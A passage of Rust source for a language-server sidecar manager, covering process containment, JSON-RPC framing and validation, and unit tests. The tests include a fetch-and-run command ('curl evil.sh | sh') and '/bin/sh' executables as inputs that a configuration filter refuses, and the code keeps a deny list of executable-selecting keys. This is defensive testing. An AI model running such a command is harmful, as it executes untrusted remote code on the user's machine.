            LanguageServiceErrorCode::InvalidWorkspace,
            "project directory is not a real directory",
        ));
    }
    let canonical_candidate = candidate.canonicalize().map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "failed to resolve project directory",
        )
    })?;
    if canonical_candidate.parent() != Some(projects_root.as_path()) {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "project directory escapes the Oleafly projects root",
        ));
    }
    let project_metadata = std::fs::symlink_metadata(canonical_candidate.join("project.json"))
        .map_err(|error| {
            let message = if error.kind() == std::io::ErrorKind::NotFound {
                "project is unknown".to_owned()
            } else {
                "failed to inspect project metadata".to_owned()
            };
            LanguageServiceError::new(LanguageServiceErrorCode::InvalidWorkspace, message)
        })?;
    if !project_metadata.is_file()
        || project_metadata.file_type().is_symlink()
        || metadata_is_reparse_point(&project_metadata)
    {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "project metadata is not a real regular file",
        ));
    }
    let resolved = paths::project_dir(project_id).map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "failed to resolve project workspace",
        )
    })?;
    if resolved != canonical_candidate {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "resolved project workspace changed during validation",
        ));
    }
    crate::project::read_meta(project_id).map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "project metadata is invalid or unreadable",
        )
    })?;
    Ok(resolved)
}

fn spawn_sidecar(
    executable: &Path,
    args: &[String],
    workspace_root: &Path,
) -> Result<SpawnedSession, LanguageServiceError> {
    let mut command = tokio::process::Command::new(executable);
    command
        .no_console()
        .args(args)
        .current_dir(workspace_root)
        .kill_on_drop(true)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    isolate_process_tree(&mut command);
    let mut child = command.spawn().map_err(|error| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::SidecarUnavailable,
            format!("failed to start the pinned language server: {error}"),
        )
    })?;
    let pid = child.id().ok_or_else(|| {
        let _ = child.start_kill();
        LanguageServiceError::new(
            LanguageServiceErrorCode::Internal,
            "spawned language server did not expose a process id",
        )
    })?;
    let containment = contain_process_tree(pid).map_err(|error| {
        terminate_process_tree_now(pid);
        let _ = child.start_kill();
        LanguageServiceError::new(
            LanguageServiceErrorCode::SidecarUnavailable,
            format!("failed to contain the language-server process tree: {error}"),
        )
    })?;
    let stdin = child.stdin.take().ok_or_else(|| {
        let _ = child.start_kill();
        LanguageServiceError::new(
            LanguageServiceErrorCode::Internal,
            "language-server stdin was not captured",
        )
    })?;
    let stdout = child.stdout.take().ok_or_else(|| {
        let _ = child.start_kill();
        LanguageServiceError::new(
            LanguageServiceErrorCode::Internal,
            "language-server stdout was not captured",
        )
    })?;
    let stderr = child.stderr.take().ok_or_else(|| {
        let _ = child.start_kill();
        LanguageServiceError::new(
            LanguageServiceErrorCode::Internal,
            "language-server stderr was not captured",
        )
    })?;
    Ok(SpawnedSession {
        child,
        stdin,
        stdout,
        stderr,
        pid,
        containment,
    })
}

fn stop_spawned_session_now(mut spawned: SpawnedSession) {
    terminate_process_tree_now(spawned.pid);
    let _ = spawned.child.start_kill();
}

async fn run_session(runtime: SessionRuntime) {
    let SessionRuntime {
        registry,
        record,
        mut child,
        stdin,
        stdout,
        stderr,
        containment,
        outbound_rx,
        mut stop_rx,
    } = runtime;

    let stdout_events = record.events.clone();
    let mut stdout_task = tokio::spawn(async move { pump_stdout(stdout, stdout_events).await });
    let stderr_events = record.events.clone();
    let mut stderr_task = tokio::spawn(async move { pump_stderr(stderr, stderr_events).await });
    let mut writer_task = tokio::spawn(async move { pump_stdin(stdin, outbound_rx).await });

    let mut stdout_joined = false;
    let mut stderr_joined = false;
    let mut writer_joined = false;
    let mut outcome = loop {
        tokio::select! {
            result = child.wait() => {
                break process_wait_outcome(result, *stop_rx.borrow());
            }
            changed = stop_rx.changed() => {
                if changed.is_err() || *stop_rx.borrow() {
                    break stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                }
            }
            result = &mut stdout_task => {
                stdout_joined = true;
                if *stop_rx.borrow() {
                    break stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                }
                if let Some(reason) = handle_stdout_completion(&record.events, result) {
                    let mut stopped =
                        stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                    stopped.status = LanguageServiceStatus::Failed;
                    stopped.reason = reason;
                    break stopped;
                }
                match tokio::time::timeout(PIPE_DRAIN_TIMEOUT, child.wait()).await {
                    Ok(result) => break process_wait_outcome(result, *stop_rx.borrow()),
                    Err(_) => {
                        if *stop_rx.borrow() {
                            break stop_process(
                                &mut child,
                                record.pid.load(Ordering::Acquire),
                            )
                            .await;
                        }
                        let _ = record.events.emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stdout,
                            message: "language server closed stdout without exiting".into(),
                        });
                        let mut stopped =
                            stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                        stopped.status = LanguageServiceStatus::Failed;
                        stopped.reason = "language server closed stdout without exiting".into();
                        break stopped;
                    }
                }
            }
            result = &mut stderr_task => {
                stderr_joined = true;
                if *stop_rx.borrow() {
                    break stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                }
                if let Some(reason) = handle_stderr_completion(&record.events, result) {
                    let mut stopped =
                        stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                    stopped.status = LanguageServiceStatus::Failed;
                    stopped.reason = reason;
                    break stopped;
                }
                match tokio::time::timeout(PIPE_DRAIN_TIMEOUT, child.wait()).await {
                    Ok(result) => break process_wait_outcome(result, *stop_rx.borrow()),
                    Err(_) => {
                        if *stop_rx.borrow() {
                            break stop_process(
                                &mut child,
                                record.pid.load(Ordering::Acquire),
                            )
                            .await;
                        }
                        let _ = record.events.emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stderr,
                            message: "language server closed stderr without exiting".into(),
                        });
                        let mut stopped =
                            stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                        stopped.status = LanguageServiceStatus::Failed;
                        stopped.reason = "language server closed stderr without exiting".into();
                        break stopped;
                    }
                }
            }
            result = &mut writer_task => {
                writer_joined = true;
                if *stop_rx.borrow() {
                    break stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                }
                match result {
                    Ok(Ok(())) => {
                        let _ = record.events.emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stdin,
                            message: "language-server stdin writer closed unexpectedly".into(),
                        });
                    }
                    Ok(Err(message)) => {
                        let _ = record.events.emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stdin,
                            message: bounded_message(message),
                        });
                    }
                    Err(error) => {
                        let _ = record.events.emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stdin,
                            message: bounded_message(format!("stdin task failed: {error}")),
                        });
                    }
                }
                let mut stopped = stop_process(&mut child, record.pid.load(Ordering::Acquire)).await;
                stopped.status = LanguageServiceStatus::Failed;
                stopped.reason = "language-server stdin transport failed".into();
                break stopped;
            }
        }
    };

    // The process group/job is an ownership boundary, not just a stop helper.
    // Closing it after the leader exits also terminates helpers that detached
    // their stdio and would otherwise survive a successful or failed session.
    drop(containment);

    if !stdout_joined {
        if *stop_rx.borrow() && outcome.status != LanguageServiceStatus::Stopped {
            outcome.status = LanguageServiceStatus::Stopped;
            outcome.reason = "stop requested".into();
        }
        match tokio::time::timeout(PIPE_DRAIN_TIMEOUT, &mut stdout_task).await {
            Ok(result) => {
                if *stop_rx.borrow() && outcome.status != LanguageServiceStatus::Stopped {
                    outcome.status = LanguageServiceStatus::Stopped;
                    outcome.reason = "stop requested".into();
                } else if outcome.status != LanguageServiceStatus::Stopped {
                    if let Some(reason) = handle_stdout_completion(&record.events, result) {
                        outcome.status = LanguageServiceStatus::Failed;
                        outcome.reason = reason;
                    }
                }
            }
            Err(_) => {
                stdout_task.abort();
                if *stop_rx.borrow() && outcome.status != LanguageServiceStatus::Stopped {
                    outcome.status = LanguageServiceStatus::Stopped;
                    outcome.reason = "stop requested".into();
                } else if outcome.status != LanguageServiceStatus::Stopped {
                    let _ = record
                        .events
                        .emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stdout,
                            message: "stdout pipe did not close after the language server exited"
                                .into(),
                        });
                    let pid = record.pid.load(Ordering::Acquire);
                    if pid != 0 {
                        let _ =
                            tokio::time::timeout(PROCESS_KILL_TIMEOUT, terminate_process_tree(pid))
                                .await;
                    }
                    outcome.status = LanguageServiceStatus::Failed;
                    outcome.reason =
                        "stdout pipe remained open after the language server exited".into();
                }
            }
        }
    }
    if !writer_joined {
        writer_task.abort();
    }
    if !stderr_joined {
        match tokio::time::timeout(PIPE_DRAIN_TIMEOUT, &mut stderr_task).await {
            Ok(result) => {
                if !*stop_rx.borrow() && outcome.status != LanguageServiceStatus::Stopped {
                    if let Some(reason) = handle_stderr_completion(&record.events, result) {
                        outcome.status = LanguageServiceStatus::Failed;
                        outcome.reason = reason;
                    }
                }
            }
            Err(_) => {
                stderr_task.abort();
                if !*stop_rx.borrow() && outcome.status != LanguageServiceStatus::Stopped {
                    let _ = record
                        .events
                        .emit(LanguageServiceEventPayload::TransportError {
                            stream: TransportStream::Stderr,
                            message: "stderr pipe did not close after the language server exited"
                                .into(),
                        });
                    let pid = record.pid.load(Ordering::Acquire);
                    if pid != 0 {
                        let _ =
                            tokio::time::timeout(PROCESS_KILL_TIMEOUT, terminate_process_tree(pid))
                                .await;
                    }
                    outcome.status = LanguageServiceStatus::Failed;
                    outcome.reason =
                        "stderr pipe remained open after the language server exited".into();
                }
            }
        }
    }

    record.pid.store(0, Ordering::Release);
    complete_session(&registry, &record, &outcome);
    record.status.send_replace(outcome.status);
    let _ = record.events.emit(LanguageServiceEventPayload::Exited {
        status: outcome.status,
        exit_code: outcome.exit_code,
        signal: outcome.signal,
        reason: outcome.reason.clone(),
    });
}

async fn pump_stdin(
    mut stdin: tokio::process::ChildStdin,
    mut outbound: mpsc::Receiver<OutboundFrame>,
) -> Result<(), String> {
    while let Some(frame) = outbound.recv().await {
        stdin
            .write_all(&frame.bytes)
            .await
            .map_err(|error| format!("failed to write language-server stdin: {error}"))?;
        stdin
            .flush()
            .await
            .map_err(|error| format!("failed to flush language-server stdin: {error}"))?;
    }
    let _ = stdin.shutdown().await;
    Ok(())
}

async fn pump_stdout<R>(mut stdout: R, events: EventHub) -> Result<(), StdoutFailure>
where
    R: AsyncRead + Unpin,
{
    let mut decoder = JsonRpcDecoder::default();
    let mut chunk = [0_u8; 8192];
    loop {
        let read = stdout.read(&mut chunk).await.map_err(|error| {
            StdoutFailure::Io(format!("failed to read language-server stdout: {error}"))
        })?;
        if read == 0 {
            decoder.finish().map_err(StdoutFailure::Protocol)?;
            return Ok(());
        }
        for message in decoder
            .push(&chunk[..read])
            .map_err(StdoutFailure::Protocol)?
        {
            if !events.emit(LanguageServiceEventPayload::Message { message }) {
                return Err(StdoutFailure::ChannelClosed);
            }
        }
    }
}

fn handle_stdout_completion(
    events: &EventHub,
    result: Result<Result<(), StdoutFailure>, tokio::task::JoinError>,
) -> Option<String> {
    match result {
        Ok(Ok(())) => None,
        Ok(Err(StdoutFailure::Protocol(failure))) => {
            let message = bounded_message(failure.message);
            let _ = events.emit(LanguageServiceEventPayload::ProtocolError {
                code: failure.code,
                message: message.clone(),
            });
            Some(bounded_message(format!(
                "language-server protocol failed: {message}"
            )))
        }
        Ok(Err(StdoutFailure::Io(message))) => {
            let message = bounded_message(message);
            let _ = events.emit(LanguageServiceEventPayload::TransportError {
                stream: TransportStream::Stdout,
                message: message.clone(),
            });
            Some(bounded_message(format!(
                "language-server stdout failed: {message}"
            )))
        }
        Ok(Err(StdoutFailure::ChannelClosed)) => {
            Some("language-service event channel closed".into())
        }
        Err(error) => {
            let message = bounded_message(format!("stdout task failed: {error}"));
            let _ = events.emit(LanguageServiceEventPayload::TransportError {
                stream: TransportStream::Stdout,
                message: message.clone(),
            });
            Some(message)
        }
    }
}

async fn pump_stderr<R>(mut stderr: R, events: EventHub) -> Result<(), StderrFailure>
where
    R: AsyncRead + Unpin,
{
    let mut emitted = 0_usize;
    let mut announced_truncation = false;
    let mut chunk = [0_u8; STDERR_CHUNK_BYTES];
    loop {
        let read = stderr
            .read(&mut chunk)
            .await
            .map_err(|error| StderrFailure::Io(error.to_string()))?;
        if read == 0 {
            return Ok(());
        }
        let text = String::from_utf8_lossy(&chunk[..read]);
        let remaining = MAX_STDERR_BYTES.saturating_sub(emitted);
        let take = utf8_prefix_len(&text, remaining);
        if take > 0 {
            if !events.emit(LanguageServiceEventPayload::Stderr {
                text: text[..take].to_owned(),
            }) {
                return Err(StderrFailure::ChannelClosed);
            }
            emitted += take;
        }
        if take < text.len() && !announced_truncation {
            announced_truncation = true;
            if !events.emit(LanguageServiceEventPayload::StderrTruncated {
                limit_bytes: MAX_STDERR_BYTES,
            }) {
                return Err(StderrFailure::ChannelClosed);
            }
        }
    }
}

fn handle_stderr_completion(
    events: &EventHub,
    result: Result<Result<(), StderrFailure>, tokio::task::JoinError>,
) -> Option<String> {
    match result {
        Ok(Ok(())) => None,
        Ok(Err(StderrFailure::Io(message))) => {
            let message =
                bounded_message(format!("failed to read language-server stderr: {message}"));
            let _ = events.emit(LanguageServiceEventPayload::TransportError {
                stream: TransportStream::Stderr,
                message: message.clone(),
            });
            Some(message)
        }
        Ok(Err(StderrFailure::ChannelClosed)) => {
            Some("language-service event channel closed".into())
        }
        Err(error) => {
            let message = bounded_message(format!("stderr task failed: {error}"));
            let _ = events.emit(LanguageServiceEventPayload::TransportError {
                stream: TransportStream::Stderr,
                message: message.clone(),
            });
            Some(message)
        }
    }
}

async fn stop_process(child: &mut tokio::process::Child, pid: u32) -> ProcessOutcome {
    if pid != 0 {
        let _ = tokio::time::timeout(PROCESS_KILL_TIMEOUT, terminate_process_tree(pid)).await;
    }
    let _ = child.start_kill();
    match tokio::time::timeout(PROCESS_KILL_TIMEOUT, child.wait()).await {
        Ok(Ok(status)) => ProcessOutcome {
            status: LanguageServiceStatus::Stopped,
            exit_code: status.code(),
            signal: exit_signal(&status),
            reason: "stop requested".into(),
        },
        Ok(Err(error)) => ProcessOutcome {
            status: LanguageServiceStatus::Stopped,
            exit_code: None,
            signal: None,
            reason: bounded_message(format!(
                "stop requested. Process wait failed after termination: {error}"
            )),
        },
        Err(_) => ProcessOutcome {
            status: LanguageServiceStatus::Stopped,
            exit_code: None,
            signal: None,
            reason: "stop requested. The process did not report termination before timeout".into(),
        },
    }
}

fn process_wait_outcome(
    result: std::io::Result<ExitStatus>,
    stop_requested: bool,
) -> ProcessOutcome {
    match result {
        Ok(status) if stop_requested => ProcessOutcome {
            status: LanguageServiceStatus::Stopped,
            exit_code: status.code(),
            signal: exit_signal(&status),
            reason: "stop requested".into(),
        },
        Ok(status) if status.success() => ProcessOutcome {
            status: LanguageServiceStatus::Exited,
            exit_code: status.code(),
            signal: exit_signal(&status),
            reason: "language server exited".into(),
        },
        Ok(status) => ProcessOutcome {
            status: LanguageServiceStatus::Failed,
            exit_code: status.code(),
            signal: exit_signal(&status),
            reason: "language server exited unsuccessfully".into(),
        },
        Err(error) => ProcessOutcome {
            status: LanguageServiceStatus::Failed,
            exit_code: None,
            signal: None,
            reason: bounded_message(format!("failed waiting for language server: {error}")),
        },
    }
}

#[cfg(unix)]
fn exit_signal(status: &ExitStatus) -> Option<i32> {
    use std::os::unix::process::ExitStatusExt;
    status.signal()
}

#[cfg(not(unix))]
fn exit_signal(_status: &ExitStatus) -> Option<i32> {
    None
}

fn complete_session(registry: &Registry, record: &SessionRecord, outcome: &ProcessOutcome) {
    let mut inner = lock_unpoisoned(&registry.inner);
    let should_remove = inner
        .active
        .get(&record.meta.session)
        .map(|active| active.meta.generation == record.meta.generation)
        .unwrap_or(false);
    if !should_remove {
        return;
    }
    inner.active.remove(&record.meta.session);
    retain_terminal_session(
        &mut inner,
        TerminalSession {
            meta: record.meta.clone(),
            project_id: record.project_id.clone(),
            workspace_display: record.workspace_display.clone(),
            status: outcome.status,
            exit_code: outcome.exit_code,
            signal: outcome.signal,
        },
    );
}

fn remove_active_session(registry: &Registry, meta: &SessionMeta) {
    let mut inner = lock_unpoisoned(&registry.inner);
    let matches_generation = inner
        .active
        .get(&meta.session)
        .map(|active| active.meta.generation == meta.generation)
        .unwrap_or(false);
    if matches_generation {
        inner.active.remove(&meta.session);
    }
}

fn retain_terminal_session(inner: &mut RegistryInner, terminal: TerminalSession) {
    inner.terminal.push_back(terminal);
    while inner.terminal.len() > MAX_TERMINAL_SESSIONS {
        inner.terminal.pop_front();
    }
}

fn reserve_outbound_bytes(
    queued: &AtomicUsize,
    requested: usize,
) -> Result<(), LanguageServiceError> {
    let mut current = queued.load(Ordering::Acquire);
    loop {
        let next = current.checked_add(requested).ok_or_else(|| {
            LanguageServiceError::new(
                LanguageServiceErrorCode::Backpressure,
                "language-service outbound byte budget is exhausted",
            )
        })?;
        if next > MAX_OUTBOUND_QUEUE_BYTES {
            return Err(LanguageServiceError::new(
                LanguageServiceErrorCode::Backpressure,
                format!(
                    "language-service outbound queue exceeds the {MAX_OUTBOUND_QUEUE_BYTES}-byte limit"
                ),
            ));
        }
        match queued.compare_exchange_weak(current, next, Ordering::AcqRel, Ordering::Acquire) {
            Ok(_) => return Ok(()),
            Err(observed) => current = observed,
        }
    }
}

fn encode_json_rpc(message: &Value) -> Result<(Vec<u8>, usize), LanguageServiceError> {
    validate_json_rpc_value(message).map_err(|message| {
        LanguageServiceError::new(LanguageServiceErrorCode::InvalidMessage, message)
    })?;
    let body = serde_json::to_vec(message).map_err(|error| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidMessage,
            format!("failed to encode JSON-RPC message: {error}"),
        )
    })?;
    if body.len() > MAX_MESSAGE_BYTES {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidMessage,
            format!("JSON-RPC message exceeds the {MAX_MESSAGE_BYTES}-byte limit"),
        ));
    }
    let header = format!("Content-Length: {}\r\n\r\n", body.len());
    let mut frame = Vec::with_capacity(header.len() + body.len());
    frame.extend_from_slice(header.as_bytes());
    frame.extend_from_slice(&body);
    Ok((frame, body.len()))
}

/// Settings keys that let a language server choose a program to run, or the
/// arguments and environment it runs with. texlab honours
/// `texlab.build.executable` and `texlab.forwardSearch.executable`; the same
/// shape exists in other servers.
const EXECUTABLE_SETTING_KEYS: [&str; 5] = ["executable", "command", "args", "argv", "env"];

/// The JSON-RPC bridge forwards whatever method the webview asks for, so
/// `workspace/didChangeConfiguration` would otherwise let anything running in
/// the webview point a language server at an arbitrary binary and have it
/// spawned - turning script execution into process execution.
///
/// The app's own configuration is a pinned profile that only ever sets
/// behavioural flags (`texlab.build.onSave`), so refusing executable-selecting
/// keys costs nothing and closes the escalation. Scans the whole payload: the
/// keys sit several levels deep under a server-specific namespace.
fn reject_executable_settings(value: &Value) -> Result<(), String> {
    match value {
        Value::Object(map) => {
            for (key, child) in map {
                if EXECUTABLE_SETTING_KEYS
                    .iter()
                    .any(|candidate| key.eq_ignore_ascii_case(candidate))
                {
                    return Err(format!(
                        "language-server configuration may not set `{key}`: the executable, its \
                         arguments and its environment are owned by the application"
                    ));
                }
                reject_executable_settings(child)?;
            }
            Ok(())
        }
        Value::Array(items) => {
            for item in items {
                reject_executable_settings(item)?;
            }
            Ok(())
        }
        _ => Ok(()),
    }
}

fn validate_json_rpc_value(message: &Value) -> Result<(), String> {
    let object = message
        .as_object()
        .ok_or_else(|| "JSON-RPC message must be an object".to_string())?;
    if object.get("jsonrpc").and_then(Value::as_str) != Some("2.0") {
        return Err("JSON-RPC message must contain `jsonrpc: \"2.0\"`".into());
    }

    let has_method = object.contains_key("method");
    let has_result = object.contains_key("result");
    let has_error = object.contains_key("error");
    if has_method {
        let method = object
            .get("method")
            .and_then(Value::as_str)
            .ok_or_else(|| {
                "JSON-RPC request or notification must contain a string `method`".to_string()
            })?;
        if method.is_empty() {
            return Err("JSON-RPC method cannot be empty".into());
        }
        if has_result || has_error {
            return Err("JSON-RPC request cannot also contain `result` or `error`".into());
        }
        if object
            .get("params")
            .is_some_and(|params| !params.is_object() && !params.is_array())
        {
            return Err("JSON-RPC `params` must be an object or array".into());
        }
        if let Some(id) = object.get("id") {
            validate_json_rpc_id(id, false)?;
        }
        if method == "workspace/didChangeConfiguration" {
            if let Some(params) = object.get("params") {
                reject_executable_settings(params)?;
            }
        }
        return Ok(());
    }

    if !object.contains_key("id") {
        return Err("JSON-RPC response must contain `id`".into());
    }
    validate_json_rpc_id(&object["id"], true)?;
    if has_result == has_error {
        return Err("JSON-RPC response must contain exactly one of `result` or `error`".into());
    }
    if has_error {
        let error = object["error"]
            .as_object()
            .ok_or_else(|| "JSON-RPC `error` must be an object".to_string())?;
        if error.get("code").and_then(Value::as_i64).is_none() {
            return Err("JSON-RPC error must contain an integer `code`".into());
        }
        if error.get("message").and_then(Value::as_str).is_none() {
            return Err("JSON-RPC error must contain a string `message`".into());
        }
    }
    Ok(())
}

fn validate_json_rpc_id(id: &Value, allow_null: bool) -> Result<(), String> {
    let valid = id.is_string()
        || id.as_i64().is_some()
        || id.as_u64().is_some()
        || (allow_null && id.is_null());
    if valid {
        Ok(())
    } else {
        Err("JSON-RPC `id` must be a string, integer, or null response id".into())
    }
}

fn parse_content_length(headers: &[u8]) -> Result<usize, ProtocolFailure> {
    if headers.is_empty() {
        return Err(ProtocolFailure::new(
            ProtocolErrorCode::MissingContentLength,
            "JSON-RPC frame is missing the Content-Length header",
        ));
    }
    let mut content_length = None;
    let mut lines = headers.split(|byte| *byte == b'\n').peekable();
    while let Some(raw_line) = lines.next() {
        let line = if lines.peek().is_some() {
            raw_line.strip_suffix(b"\r").ok_or_else(|| {
                ProtocolFailure::new(
                    ProtocolErrorCode::InvalidHeader,
                    "JSON-RPC headers must use CRLF line endings",
                )
            })?
        } else {
            raw_line
        };
        if line.contains(&b'\r') {
            return Err(ProtocolFailure::new(
                ProtocolErrorCode::InvalidHeader,
                "JSON-RPC headers must use CRLF line endings",
            ));
        }
        let Some(colon) = line.iter().position(|byte| *byte == b':') else {
            return Err(ProtocolFailure::new(
                ProtocolErrorCode::InvalidHeader,
                "JSON-RPC header line is missing a colon",
            ));
        };
        let name = &line[..colon];
        let value = trim_ascii_whitespace(&line[colon + 1..]);
        if name.is_empty() || !name.iter().copied().all(is_header_name_byte) {
            return Err(ProtocolFailure::new(
                ProtocolErrorCode::InvalidHeader,
                "JSON-RPC header name is invalid",
            ));
        }
        if value
            .iter()
            .any(|byte| byte.is_ascii_control() && *byte != b'\t')
        {
            return Err(ProtocolFailure::new(
                ProtocolErrorCode::InvalidHeader,
                "JSON-RPC header value contains a control byte",
            ));
        }
        if name.eq_ignore_ascii_case(b"content-length") {
            if content_length.is_some() {
                return Err(ProtocolFailure::new(
                    ProtocolErrorCode::DuplicateContentLength,
                    "JSON-RPC frame contains multiple Content-Length headers",
                ));
            }
            if value.is_empty() || !value.iter().all(u8::is_ascii_digit) {
                return Err(ProtocolFailure::new(
                    ProtocolErrorCode::InvalidContentLength,
                    "Content-Length must be an unsigned base-10 integer",
                ));
            }
            let value = std::str::from_utf8(value).map_err(|_| {
                ProtocolFailure::new(
                    ProtocolErrorCode::InvalidContentLength,
                    "Content-Length is not valid ASCII",
                )
            })?;
            let parsed = value.parse::<usize>().map_err(|_| {
                ProtocolFailure::new(
                    ProtocolErrorCode::InvalidContentLength,
                    "Content-Length does not fit this platform",
                )
            })?;
            if parsed > MAX_MESSAGE_BYTES {
                return Err(ProtocolFailure::new(
                    ProtocolErrorCode::MessageTooLarge,
                    format!("JSON-RPC message exceeds the {MAX_MESSAGE_BYTES}-byte limit"),
                ));
            }
            content_length = Some(parsed);
        }
    }
    content_length.ok_or_else(|| {
        ProtocolFailure::new(
            ProtocolErrorCode::MissingContentLength,
            "JSON-RPC frame is missing the Content-Length header",
        )
    })
}

fn validate_partial_header_line_endings(bytes: &[u8]) -> Result<(), ProtocolFailure> {
    for (index, byte) in bytes.iter().copied().enumerate() {
        if byte == b'\n' && (index == 0 || bytes[index - 1] != b'\r') {
            return Err(ProtocolFailure::new(
                ProtocolErrorCode::InvalidHeader,
                "JSON-RPC headers must use CRLF line endings",
            ));
        }
        if byte == b'\r' && index + 1 < bytes.len() && bytes[index + 1] != b'\n' {
            return Err(ProtocolFailure::new(
                ProtocolErrorCode::InvalidHeader,
                "JSON-RPC headers must use CRLF line endings",
            ));
        }
    }
    Ok(())
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return Some(0);
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

fn trim_ascii_whitespace(mut value: &[u8]) -> &[u8] {
    while value
        .first()
        .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
    {
        value = &value[1..];
    }
    while value
        .last()
        .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
    {
        value = &value[..value.len() - 1];
    }
    value
}

fn is_header_name_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric()
        || matches!(
            byte,
            b'!' | b'#'
                | b'$'
                | b'%'
                | b'&'
                | b'\''
                | b'*'
                | b'+'
                | b'-'
                | b'.'
                | b'^'
                | b'_'
                | b'`'
                | b'|'
                | b'~'
        )
}

fn utf8_prefix_len(text: &str, maximum: usize) -> usize {
    let limit = maximum.min(text.len());
    (0..=limit)
        .rev()
        .find(|index| text.is_char_boundary(*index))
        .unwrap_or(0)
}

fn bounded_message(message: impl Into<String>) -> String {
    const MAX_ERROR_BYTES: usize = 2 * 1024;
    let message = message.into();
    let take = utf8_prefix_len(&message, MAX_ERROR_BYTES);
    message[..take].to_owned()
}

fn status_label(status: LanguageServiceStatus) -> &'static str {
    match status {
        LanguageServiceStatus::Running => "running",
        LanguageServiceStatus::Stopping => "stopping",
        LanguageServiceStatus::Exited => "exited",
        LanguageServiceStatus::Stopped => "stopped",
        LanguageServiceStatus::Failed => "failed",
    }
}

fn lock_unpoisoned<T>(mutex: &Mutex<T>) -> MutexGuard<'_, T> {
    mutex
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

#[cfg(windows)]
fn metadata_is_reparse_point(metadata: &std::fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt;
    use windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_REPARSE_POINT;
    metadata.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

#[cfg(not(windows))]
fn metadata_is_reparse_point(_metadata: &std::fs::Metadata) -> bool {
    false
}

fn terminate_process_tree_now(pid: u32) {
    if pid == 0 {
        return;
    }
    #[cfg(unix)]
    if let Ok(pid) = i32::try_from(pid) {
        unsafe {
            let _ = libc::kill(-pid, libc::SIGKILL);
        }
    }
    #[cfg(windows)]
    {
        let _ = std::process::Command::new("taskkill")
            .no_console()
            .args(["/PID", &pid.to_string(), "/T", "/F"])
            .status();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::fs;

    fn frame(value: &Value) -> Vec<u8> {
        encode_json_rpc(value).expect("valid frame").0
    }

    #[test]
    fn configuration_may_not_select_an_executable() {
        // The shipped profile only flips a behavioural flag, so it must pass.
        assert!(validate_json_rpc_value(&json!({
            "jsonrpc": "2.0",
            "method": "workspace/didChangeConfiguration",
            "params": {"settings": {"texlab": {"build": {"onSave": false}}}},
        }))
        .is_ok());

        // Anything that picks a program, its arguments or its environment is
        // refused however deeply it is nested, and whatever its casing.
        for settings in [
            json!({"settings": {"texlab": {"build": {"executable": "/bin/sh"}}}}),
            json!({"settings": {"texlab": {"build": {"Executable": "/bin/sh"}}}}),
            json!({"settings": {"texlab": {"forwardSearch": {"executable": "/bin/sh"}}}}),
            json!({"settings": {"texlab": {"build": {"args": ["-c", "curl evil.sh | sh"]}}}}),
            json!({"settings": {"texlab": {"build": {"env": {"PATH": "/tmp"}}}}}),
            json!({"settings": [{"nested": [{"command": "/bin/sh"}]}]}),
        ] {
            let message = json!({
                "jsonrpc": "2.0",
                "method": "workspace/didChangeConfiguration",
                "params": settings,
            });
            assert!(
                validate_json_rpc_value(&message).is_err(),
                "expected rejection for {message}"
            );
        }

        // The restriction is scoped to configuration: ordinary traffic that
        // happens to carry such a word is untouched.
        assert!(validate_json_rpc_value(&json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "workspace/executeCommand",
            "params": {"command": "texlab.build"},
        }))
        .is_ok());
    }

    fn request(id: u64, method: &str) -> Value {
        json!({"jsonrpc":"2.0","id":id,"method":method,"params":{}})
    }

    #[test]
    fn language_service_kind_is_a_closed_allowlist() {
        assert!(serde_json::from_str::<LanguageServiceKind>("\"tex_lab\"").is_err());
        assert_eq!(
            serde_json::from_str::<LanguageServiceKind>("\"texlab\"").unwrap(),
            LanguageServiceKind::TexLab
        );
        assert_eq!(
            serde_json::from_str::<LanguageServiceKind>("\"tinymist\"").unwrap(),
            LanguageServiceKind::Tinymist
        );
        assert!(serde_json::from_str::<LanguageServiceKind>("\"bash\"").is_err());
    }

    #[test]
    fn start_request_rejects_unknown_command_fields() {
        let arbitrary = json!({
            "kind": "texlab",
            "projectId": "known-project",
            "command": "/bin/sh"
        });
        assert!(serde_json::from_value::<StartLanguageServiceRequest>(arbitrary).is_err());
        assert!(
            serde_json::from_value::<StartLanguageServiceRequest>(json!({
                "kind": "texlab",
                "projectId": "known-project",
                "workspaceRoot": "/tmp"
            }))
            .is_err()
        );
    }

    #[test]
    fn every_command_request_rejects_unknown_fields() {
        assert!(
